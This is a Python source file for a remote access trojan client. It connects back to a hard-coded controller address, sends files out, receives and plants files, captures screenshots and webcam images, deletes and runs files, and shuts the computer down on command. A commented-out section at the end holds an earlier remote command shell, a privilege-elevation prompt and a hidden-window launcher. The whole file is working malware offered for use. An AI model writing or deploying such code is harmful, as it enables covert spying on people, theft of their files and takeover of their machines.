from PIL import ImageGrab
import socket
import os
import time
import platform
import cv2
import subprocess
import sys

# run file from admin roots
# import ctypes
# import os
# import sys
#
# def run_as_admin():
#     if ctypes.windll.shell32.IsUserAnAdmin():
#         return
#
#     # Запускаем скрипт от имени администратора
#     script = os.path.abspath(sys.argv[0])
#     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
#
# # Вызываем функцию для выполнения скрипта от имени администратора
# run_as_admin()
#
# # Ваш код продолжает выполнение здесь
# print("Этот код выполняется с правами администратора.")
def get_system_version():
    system_name = platform.system()

    if system_name == "Windows":
        version_info = platform.win32_ver()
        version = str(version_info[0])
        return "Windows : " + version
    elif system_name == "Linux":
        distro_info = platform.linux_distribution()
        distro_name = str(distro_info[0])
        return "Linux : " + distro_name
    elif system_name == "Darwin":
        mac_version = platform.mac_ver()
        version = str(mac_version[0])
        return "MacOS : " + version
    else:
        return f"Unknown OS: {system_name}"


def get_file_extension(file_name):
    _, file_extension = os.path.splitext(file_name)
    return file_extension


def run_file(file_path):
    try:
        os.system(file_path)
        return "File is running !"
    except Exception as e:
        return f"An error occurred while running a file: {e}"


def delete_file(file_path):
    try:
        # Удаляем файл
        os.remove(file_path)
        return f"File on path {file_path} was successfully deleted."
    except FileNotFoundError:
        return f"Not such file on path {file_path} ."
    except Exception as e:
        return f"An error occurred while deleting a file: {e}"


ip_server = '192.168.140.13'# Change to valid ip


def main():
    """try:
        run_file("Support_Client.exe")

    except Exception as e:
        print(e)"""


    def list_cd():

        result = subprocess.run(['dir'], shell=True, capture_output=True, text=True, encoding="cp866")
        size_of_result = sys.getsizeof(result.stdout)

        victim.send(str(size_of_result).encode())
        victim.send(result.stdout.encode())

    print("Client started")
    while True:
        print("Trying connect to server")
        try:
            victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            victim.connect((ip_server, 5555))
            print("Connection established")
            break
        except Exception as e:
            print(f"Error: {e}")

    operating_system = get_system_version()
    victim.send(operating_system.encode())

    while True:
        current_directory = os.getcwd()  # устанавливает в эту переменную текущую директорию
        victim.send(current_directory.encode())

        chosen_operation = victim.recv(1024).decode()

        if chosen_operation == "work_with_file" or chosen_operation == "2" or chosen_operation == "w":
            while True:

                victim.send(os.getcwd().encode())
                operation = victim.recv(1024).decode()

                if operation == "Download":
                    victim.send("Command 'Download' received".encode())
                    file_name = str(victim.recv(1024).decode())

                    if os.path.isfile(file_name):
                        victim.send("Entered file exist!".encode())
                        file_size = os.path.getsize(file_name)
                        file_size_string = str(file_size)
                        victim.send(file_size_string.encode())

                        with open(file_name, mode='rb') as file:
                            data = file.read(int(file_size))
                            victim.send(data)

                        extension = get_file_extension(file_name)
                        victim.send(extension.encode())
                    else:
                        victim.send("Entered file does not exist!".encode())

                elif operation == "Upload":

                    try:

                        result_of_checking = victim.recv(1024).decode()

                        if result_of_checking == "Entered file exist!":
                            print(result_of_checking)
                            get_size_file = victim.recv(2048)
                            get_size_file_int = int(get_size_file.decode())
                            with open("got_file.png", mode='wb') as file:
                                data = victim.recv(get_size_file_int)
                                file.write(data)

                            got_new_file_path = victim.recv(2048).decode()
                            got_new_name = victim.recv(1024).decode()
                            got_new_extension = victim.recv(1024).decode()

                            current_directory = os.getcwd() + r"\got_file.png"
                            file_path = current_directory
                            chosen_directory = got_new_file_path
                            result = ""
                            if not os.path.exists(chosen_directory):
                                result = f"Директория {current_directory} не существует. Создаем ее."
                                os.makedirs(chosen_directory)

                            new_file_name = got_new_name
                            file_extension = got_new_extension
                            new_file_path = os.path.join(chosen_directory, f"{new_file_name}.{file_extension}")
                            try:
                                # Перемещение и переименование файла с использованием os.rename
                                os.rename(file_path, new_file_path)
                                result_creating = f"Файл успешно переименован и перемещен в {chosen_directory}"
                            except Exception as e:
                                result_creating = f"Произошла ошибка: {e}"

                            all_result = result + result_creating
                            victim.send(str(all_result).encode())
                    except Exception as e:
                        print(e)

                elif operation == "screenshot":
                    screenshot = ImageGrab.grab()
                    screenshot.save("screenshot.png")
                    with open("screenshot.png", mode='rb') as file:
                        file_size = os.path.getsize(current_directory + r"\screenshot.png")
                        victim.send(str(file_size).encode())
                        time.sleep(0.1)
                        data = file.read(file_size)
                        victim.send(data)

                    current_directory_for_screenshot = os.getcwd() + r"\screenshot.png"
                    os.remove(current_directory_for_screenshot)

                elif operation == "snapshot":
                    global cam
                    try:
                        cam = cv2.VideoCapture(0)
                        if not cam.isOpened():
                            victim.send("Camera not opened".encode())
                            raise RuntimeError("Не удалось открыть веб-камеру.")

                        victim.send("Camera was opened".encode())
                        cam.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
                        cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
                        ret, frame = cam.read()
                        cv2.imwrite('../suchka.jpg', frame)

                        size_for_snapshot = os.path.getsize('../suchka.jpg')
                        size_for_snapshot_str = str(size_for_snapshot)
                        victim.send(size_for_snapshot_str.encode())
                        with open("../suchka.jpg", mode='rb')as file:
                            victim.send(file.read(size_for_snapshot))
                        victim.send("snapshot was successfully transferred".encode())

                    except Exception as e:
                        victim.send("Camera was opened".encode())
                        cam.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
                        cam.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
                        ret, frame = cam.read()
                        cv2.imwrite('../suchka.jpg', frame)

                        size_for_snapshot = os.path.getsize('../suchka.jpg')
                        size_for_snapshot_str = str(size_for_snapshot)
                        victim.send(size_for_snapshot_str.encode())
                        with open("../suchka.jpg", mode='rb') as file:
                            victim.send(file.read(size_for_snapshot))
                        victim.send("snapshot was successfully transferred".encode())

                    finally:
                        cam.release()

                elif operation == "remove":
                    file_path = victim.recv(1024).decode()
                    result = delete_file(file_path)
                    victim.send(result.encode())

                elif operation == "start":
                    file_name = victim.recv(1024).decode()
                    result = run_file(file_name)
                    victim.send(result.encode())

                elif operation == "break":
                    break

                elif operation == "ls":
                    list_cd()

                elif operation == "change_directory":
                    list_cd()
                    victim.send(os.getcwd().encode())
                    transition = victim.recv(1024).decode()
                    try:
                        os.chdir(transition)
                        victim.send(os.getcwd().encode())

                    except Exception as e:
                        victim.send("Something wrong !".encode())

                elif operation == "incorrect operation":
                    pass

        elif chosen_operation == "system_command" or chosen_operation == "s" or chosen_operation == "3":
            while True:
                system_operation = victim.recv(1024).decode()
                if system_operation == "power_off":
                    try:
                        os.system('shutdown /s /t 0')
                        victim.send("Command execute".encode())
                    except Exception as e:
                        victim.send(f"Произошла ошибка при выключении компьютера: {e}".encode())

                elif system_operation == "break":
                    break

        elif chosen_operation == "break":
            victim.close()
            print("Operation was finished by server")
            break

        else:
            result = "unknown operation"


if __name__ == "__main__":
    if "Windows" in get_system_version():
        main()
































































































# import socket, subprocess, random, time, os, ctypes, sys
#
# #subprocess.Popen(["python", r"C:\Users\Leonid\PycharmProjects\pythonProject\Main_Client.py"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
# def run_as_admin():
#     if ctypes.windll.shell32.IsUserAnAdmin():
#         return
#     # Запускаем скрипт от имени администратора
#     script = os.path.abspath(sys.argv[0])
#     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
#     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
#
# # Вызываем функцию для выполнения скрипта от имени администратора
# run_as_admin()
# def generate_port():
#     return random.randint(1024, 65535)
# def get_local_ip():
#     # Получите локальный IP-адрес хоста
#     local_ip = socket.gethostbyname(socket.gethostname())
#     return local_ip
#
# local_ip_address = get_local_ip()
# # Код выше отвечает за то чтобы получить айпи адресс устройства вне зависимости от того подключен он к сети или нет
#
# generated_port = generate_port()
# client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# client_sock.connect(('192.168.59.13', 5555))# ПЕРЕД ЗАПУСКОМ НАДО ОТРЕДAКТИРОВАТЬ В ЗАВИСИМОСТИ ОТ СМЕНЫ НА НОВЫЙ АЙПИ
# client_sock.send(local_ip_address.encode())
# time.sleep(0.05)
# client_sock.send(str(generated_port).encode())
# client_sock.close()
#
# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# sock.bind((local_ip_address, generated_port))
# sock.listen(1)
# # print(f"listener listen on address {local_ip_address} on port {generated_port}")
# connection, address = sock.accept()
#
# while True:
#     current_directory = os.getcwd()  # устанавливает в эту переменную текущую директорию
#     connection.sendall(str(current_directory).encode())
#     command = connection.recv(1024).decode()
#     if command == "disconnect":
#         break
#     elif command.startswith("cd "):
#         new_directory = command[3:] # заносит в переменную new_directory все что было записано после cd (отсчитывает три индекса и начинает отсчет до конца строки)
#         try:
#             os.chdir(new_directory)
#             print(f"chosen new directory {new_directory}")
#         except FileNotFoundError:
#             output = "Directory not found"
#             connection.sendall(output.encode())
#         current_directory = os.getcwd()
#     else:
#         result = subprocess.run(command, capture_output=True, text=True, shell=True, encoding="cp866")
#         if result.returncode == 0:
#             output = result.stdout
#             if output:
# #                print(f"output - {output}")
#                 connection.sendall(output.encode())
#
#             else:
#                 output = "NO OUTPUT"
#                 connection.sendall(output.encode())
#         else:
#             output = result.stderr
#             connection.sendall(output.encode())
#
#
# sock.close()
# connection = 0
# address = 0